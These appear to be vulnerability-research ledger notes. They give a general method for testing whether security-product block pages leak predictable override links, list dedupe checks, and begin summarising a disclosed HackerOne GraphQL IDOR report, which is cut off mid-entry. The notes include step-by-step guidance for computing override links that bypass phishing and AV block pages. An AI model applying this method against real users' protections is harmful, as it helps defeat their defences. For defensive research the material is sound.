TRANSFERABLE TEST: for EVERY client-side security product that injects a block/override/interstitial page into web traffic (AV web protection, phishing filters, corporate web-filter "blocked site" pages, banking "Safe Money"/hardware-key prompts, parental-control block pages) — (1) inspect the ORIGIN the interstitial is served from: if it is the SAME origin as the blocked site (first-party) rather than a vendor-owned host, it is readable by the blocked page's script; (2) harvest the override/continue links from the interstitial (`https://<host>/?<id>_<token>_<guid>_`, `/kis_cup_<guid>_<id>`) and test whether the GUID is a CONSTANT across sessions and the id a COUNTER; (3) compute the next few links by incrementing the counter and confirm they still work; (4) test whether the same link format/token appears on OTHER protective surfaces in the same product (certificate warnings, banking prompts, anti-phishing warnings) — a shared token turns one surface's leak into all surfaces' override; (5) check for an `X-Frame-Options`/origin restriction on the interstitial frame. Rule: **a security product's interstitial page is part of the attack surface of every site it blocks — if the page is first-party to the blocked origin, its override links are readable, and a counter-plus-constant-token link format makes every future override computable.**
DEDUPE: 0 hits across all three write targets for `469372`, `palant`, `kis_cup`, `link_id`, `touch.kaspersky`, `url_advisor_balloon`, `INJECT_ID`, `rebinding_server`, `certerror_override`, `Safe Money`, `kis.v2.scr.kaspersky-labs.com`. Pre-existing material REVIEWED as related-but-distinct: §17.366 (the Acronis/devicelock Bitrix stored-XSS entry) is a SERVER-side profile field rendered by a public page — a different primitive (unsanitized storage), not a first-party interstitial; the ledger's postMessage/origin material is overwhelmingly `postMessage`-handler classes (95 `postMessage` hits, mostly origin-validation and `event.origin` checks on message handlers) and §17.352 (JS-unicode-escape bypass of HTML-entity encoding) — NONE records a PREDICTABLE OVERRIDE LINK carried by a first-party interstitial, and NONE records the counter+constant-GUID link format shared across certificate-warning / Safe Money / anti-phishing surfaces. New general method -> §17.369.

SOURCE: https://hackerone.com/reports/717716  2026-11-10
ROUTE: `web_extract` on the live report page -> HTTP 200, the full PoC GraphQL request, the two source-code excerpts and the Impact section all rendered IN FULL; the live `.json` route -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (1,302 B). No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no HackerOne GraphQL endpoint was called this pass; every request shape and code excerpt below is verbatim from the report body).
CLASS: IDOR / broken object-level authorization in a GraphQL MUTATION on a SERVICE-STATE object — the mutation resolves the target team with a visibility scope (`teams_i_can_see`) instead of a MANAGEMENT scope, and the downstream interactor explicitly `skip_authorization`, so any user who can merely SEE a program can suspend/resume that program's Gateway (VPN) service (CWE-639 / CWE-284; HackerOne labelled it Insecure Direct Object Reference (IDOR), severity medium 5.0, reporter `jobert`, submitted 2019-10-18, disclosed 2019-10-21, asset hackerone.com, CVSS metrics AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L).
CORE METHOD (verbatim from the report body):
  1. THE FINDING, verbatim: "An Insecure Direct Object Reference (IDOR) vulnerability is present in the `UpdateGatewayProgramStateMutation` that'd allow an attacker to suspend and resume the HackerOne Gateway feature for any program the user has access to.
